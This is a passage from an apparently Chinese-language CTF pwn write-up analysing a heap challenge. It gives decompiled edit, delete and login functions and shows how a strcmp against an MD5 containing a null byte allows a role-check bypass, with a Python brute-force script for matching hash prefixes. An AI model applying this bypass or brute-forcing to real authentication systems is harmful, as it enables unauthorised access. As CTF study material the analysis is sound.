class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">edit_2</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  index = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( info-&gt;ptr[index] &amp;&amp; info-&gt;size[index] &amp;&amp; !info-&gt;flag1[index] )</span><br><span class="line">    &#123;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the Mummy&#x27;s message: &quot;</span>);</span><br><span class="line">      v6 = info-&gt;size[index] / <span class="number">0x30</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6 &amp;&amp; !(<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">read_n</span>(&amp;info-&gt;ptr[index][<span class="number">0x30</span> * i + <span class="number">0x10</span>], <span class="number">0x10</span>LL); ++i )</span><br><span class="line">        ;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">edit_3</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  index = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( info-&gt;ptr[index] &amp;&amp; info-&gt;size[index] &amp;&amp; !info-&gt;flag1[index] )</span><br><span class="line">    &#123;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the Daddy&#x27;s message: &quot;</span>);</span><br><span class="line">      v6 = info-&gt;size[index] / <span class="number">0x30</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6 &amp;&amp; !(<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">read_n</span>(&amp;info-&gt;ptr[index][<span class="number">0x30</span> * i + <span class="number">0x20</span>], <span class="number">0x10</span>LL); ++i )</span><br><span class="line">        ;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>3只猪可以修改的索引范围和可以<code>add</code>的索引范围相同。而且修改时需要有一个标志位为0。这个标志位和<code>view message</code>的标志位相同。本题限制<code>edit</code>的次数最多为8次。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">delete</span><span class="params">(Info *info, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="built_in">delete_1</span>(info);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="built_in">delete_2</span>(info);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      <span class="built_in">delete_3</span>(info);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">delete_1</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> num; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  num = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( num &lt; <span class="number">0x14</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( info-&gt;ptr[num] &amp;&amp; !info-&gt;flag1[num] &amp;&amp; !info-&gt;flag2[num] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(info-&gt;ptr[num]);</span><br><span class="line">      info-&gt;flag1[num] = <span class="number">1</span>;</span><br><span class="line">      info-&gt;flag2[num] = <span class="number">1</span>;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">delete_2</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> num; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  num = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( num &lt; <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( info-&gt;ptr[num] &amp;&amp; !info-&gt;flag1[num] &amp;&amp; !info-&gt;flag2[num] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(info-&gt;ptr[num]);</span><br><span class="line">      info-&gt;flag1[num] = <span class="number">1</span>;</span><br><span class="line">      info-&gt;flag2[num] = <span class="number">1</span>;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">delete_3</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> num; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  num = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( num &lt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( info-&gt;ptr[num] &amp;&amp; !info-&gt;flag1[num] &amp;&amp; !info-&gt;flag2[num] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(info-&gt;ptr[num]);</span><br><span class="line">      info-&gt;flag1[num] = <span class="number">1</span>;</span><br><span class="line">      info-&gt;flag2[num] = <span class="number">1</span>;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>3只猪可以删除的索引范围和可以<code>add</code>的索引范围相同。删除后会将两个标志位置为1。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  <span class="type">int</span> v5[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">80</span>]; <span class="comment">// [rsp+70h] [rbp-B0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">88</span>]; <span class="comment">// [rsp+C0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(</span><br><span class="line">         &amp;std::cout,</span><br><span class="line">         <span class="string">&quot;Please enter the identity password of the corresponding user:&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v0, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="built_in">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(v7, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">read_n</span>(s, <span class="number">0x40</span>LL);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;What&#x27;s this?&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">MD5_initalize</span>(v5);</span><br><span class="line">  <span class="built_in">MD5_init1</span>(v5, s, v4);</span><br><span class="line">  <span class="built_in">MD5_init2</span>(v5, (__int64)v7);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(v7, <span class="string">&quot;\xA2&#x27;\x90\xD5\xEA\xD5\x37\xA3\xE1\x6D\x4Fc\x17\x7F\xB2X&quot;</span>, <span class="number">0x11</span>uLL)</span><br><span class="line">    || !<span class="built_in">memcmp</span>(v7, <span class="string">&quot;R\xEC\x3C\x4An\x13\&quot;#\xCA\xF9L\xA2\xFA\x8D\x9B&#123;&quot;</span>, <span class="number">0x11</span>uLL)</span><br><span class="line">    <span class="comment">// 第三位为 &#x27;\x00&#x27;，存在提前截断。</span></span><br><span class="line">    || !<span class="built_in">strcmp</span>(v7, <span class="string">&quot;&lt;D\x00T\x92c \xAC\xF0\xAA\x1C\xBA\x8C\xBD\x96\xDA&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[<span class="number">0</span>] == <span class="string">&#x27;C&#x27;</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">3LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)s[<span class="number">0</span>] - <span class="string">&#x27;A&#x27;</span> &lt;= <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( s[<span class="number">0</span>] == <span class="string">&#x27;B&#x27;</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Couldn&#x27;t find this password!&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">MD5_initalize</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="comment">// MD5魔数</span></span><br><span class="line">  *a1 = <span class="number">0</span>;</span><br><span class="line">  a1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  a1[<span class="number">2</span>] = <span class="number">0x67452301</span>;</span><br><span class="line">  a1[<span class="number">3</span>] = <span class="number">0xEFCDAB89</span>;</span><br><span class="line">  a1[<span class="number">4</span>] = <span class="number">0x98BADCFE</span>;</span><br><span class="line">  a1[<span class="number">5</span>] = <span class="number">0x10325476</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>根据条件爆破密码。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_string</span>(<span class="params">start_char</span>):</span><br><span class="line">    chars = string.ascii_letters + string.digits</span><br><span class="line">    <span class="keyword">for</span> guess <span class="keyword">in</span> itertools.product(chars, repeat=<span class="number">5</span>):</span><br><span class="line">        s = start_char + <span class="string">&#x27;&#x27;</span>.join(guess)</span><br><span class="line">        md5_value = hashlib.md5(s.encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> md5_value[:<span class="number">6</span>] == <span class="string">&#x27;3c4400&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(find_string(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(find_string(<span class="string">&#x27;B&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(find_string(<span class="string">&#x27;C&#x27;</span>))</span><br></pre></td></tr></table></figure></div>

<p>需要知道每个角色的密码，才能通过对应密码 <code>md5</code> 的比较判断，但是这里判断用的 <code>strcmp</code>，且其中有个 <code>md5</code> 值中的包含 <code>‘\x00’ </code> ，所以实际上会提前截断，而以<code> ‘\x3c\x44\x00’</code> 开头的 <code>md5</code>，对应的原值其实是有很多的，所以这里可以任意切换角色。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">set_info1</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(state, info, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(state-&gt;info1.size, info-&gt;size, <span class="built_in">sizeof</span>(state-&gt;info1.size));</span><br><span class="line">  <span class="built_in">memcpy</span>(state-&gt;info1.flag2, info-&gt;flag2, <span class="built_in">sizeof</span>(state-&gt;info1.flag2));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">set_info2</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;state-&gt;info2, info, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(state-&gt;info2.size, info-&gt;size, <span class="built_in">sizeof</span>(state-&gt;info2.size));</span><br><span class="line">  <span class="built_in">memcpy</span>(state-&gt;info2.flag2, info-&gt;flag2, <span class="built_in">sizeof</span>(state-&gt;info2.flag2));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">set_info3</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;state-&gt;info3, info, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(state-&gt;info3.size, info-&gt;size, <span class="built_in">sizeof</span>(state-&gt;info3.size));</span><br><span class="line">  <span class="built_in">memcpy</span>(state-&gt;info3.flag2, info-&gt;flag2, <span class="built_in">sizeof</span>(state-&gt;info3.flag2));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">get_info_1</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(info, state, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;size, state-&gt;info1.size, <span class="built_in">sizeof</span>(info-&gt;size));</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;flag1, state-&gt;info1.flag1, <span class="built_in">sizeof</span>(info-&gt;flag1));</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;flag2, state-&gt;info1.flag2, <span class="built_in">sizeof</span>(info-&gt;flag2));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">get_info2</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(info, &amp;state-&gt;info2, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;size, state-&gt;info2.size, <span class="built_in">sizeof</span>(info-&gt;size));</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;flag1, state-&gt;info2.flag1, <span class="built_in">sizeof</span>(info-&gt;flag1));</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;flag2, state-&gt;info2.flag2, <span class="built_in">sizeof</span>(info-&gt;flag2));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">get_info_3</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(info, &amp;state-&gt;info3, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;size, state-&gt;info3.size, <span class="built_in">sizeof</span>(info-&gt;size));</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;flag1, state-&gt;info3.flag1, <span class="built_in">sizeof</span>(info-&gt;flag1));</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;flag2, state-&gt;info3.flag2, <span class="built_in">sizeof</span>(info-&gt;flag2));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

